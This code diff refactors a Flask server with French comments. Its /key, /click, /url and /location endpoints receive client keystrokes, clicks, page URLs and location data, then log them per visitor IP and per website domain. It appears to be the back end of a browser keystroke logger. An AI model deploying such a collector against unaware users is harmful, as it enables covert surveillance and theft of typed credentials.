@@ -21,45 +21,46 @@ def add_cors_headers(response):
     response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
     return response
 
+
 # Route pour envoyer une réponse simple pour la route GET
 @app.route('/', methods=['GET'])
 def hello_world():
     return 'Hello World!'
 
-# Route pour recevoir les données du client - key
+# Route pour recevoir les données du client - URL
 @app.route('/url', methods=['POST'])
 def receive_url():
     if request.headers.get('X-Forwarded-For'):
         visitor_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
     else:
         visitor_ip = request.remote_addr
-        
+
     received_data = request.json
-    print('url :', received_data)
+    print('URL:', received_data)
     dossier(visitor_ip, received_data)
     return 'Données reçues'
 
-
+# Route pour recevoir les données du client - Key
 @app.route('/key', methods=['POST'])
 def receive_key():
     if request.headers.get('X-Forwarded-For'):
         visitor_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
     else:
         visitor_ip = request.remote_addr
-    
+
     received_data = request.json
     print(f'Données reçues touche {visitor_ip}: {received_data}')
     dossier(visitor_ip, received_data)
     return 'Données reçues'
 
-# Route pour recevoir les données du client - click
+# Route pour recevoir les données du client - Click
 @app.route('/click', methods=['POST'])
 def receive_click():
     if request.headers.get('X-Forwarded-For'):
         visitor_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
     else:
         visitor_ip = request.remote_addr
-    
+
     received_data = request.json
     print(f'Données reçues click {visitor_ip}: {received_data}')
     dossier(visitor_ip, received_data)
@@ -72,49 +73,47 @@ def receive_location():
         visitor_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
     else:
         visitor_ip = request.remote_addr
-    
+
     received_data = request.json
     print(f'Données de localisation reçues de {visitor_ip}: {received_data}')
     return 'Données de localisation reçues par le serveur'
 
-
+# Fonction pour gérer l'écriture des données dans les fichiers de log
 def dossier(ip, data):
     print('________________________________________________________')
-    print('ip :', ip, "data :", data)
+    print('IP:', ip, "Data:", data)
+    
+    # Création du répertoire IP si nécessaire
     data_ip_dir = f"Data/{ip}"
-    print(data_ip_dir)
     if not os.path.exists(data_ip_dir):
         os.makedirs(data_ip_dir)
-        print('dossier créé')
+        print('Dossier créé:', data_ip_dir)
     else:
-        print('dossier déjà existant')
+        print('Dossier déjà existant:', data_ip_dir)
 
+    # Extraction du domaine de l'URL et création des répertoires nécessaires
     url = data['url']
-    print(url)
-
-    url = url.split('//')
-    url = url[1].split('/')
-    url = url[0]
-    print(url)
-
-    data_url_dir = f"Data/{ip}/{url}"
-    print(data_url_dir)
+    domain = url.split('//')[1].split('/')[0]
+    data_url_dir = f"Data/{ip}/{domain}"
+    
     if not os.path.exists(data_url_dir):
         os.makedirs(data_url_dir)
-        print('dossier créé')
+        print('Dossier créé:', data_url_dir)
     else:
-        print('dossier déjà existant')
+        print('Dossier déjà existant:', data_url_dir)
 
-    data_log_dir = f"Data/{ip}/{url}/log.txt"
-
-    with open(data_log_dir, 'a', encoding="utf-8") as f:
+    # Écriture des données dans le fichier de log
+    log_file = os.path.join(data_url_dir, 'log.txt')
+    with open(log_file, 'a', encoding="utf-8") as f:
         json.dump(data, f, ensure_ascii=False, indent=4)    
         f.write('\n')
-        print('Données écrites dans le fichier', data_log_dir)
+        print('Données écrites dans le fichier:', log_file)
     
     print('________________________________________________________')
 
-
-# Démarrer le serveur Flask
+# Démarrer le serveur Flask avec SSL/TLS
 if __name__ == '__main__':
-    app.run(host='192.168.0.41', port=port)
+    cert_path = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'apache-certificate.crt')
+    key_path = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'apache.key')
+    app.run(host='192.168.0.41', port=port, ssl_context=(cert_path, key_path))
+
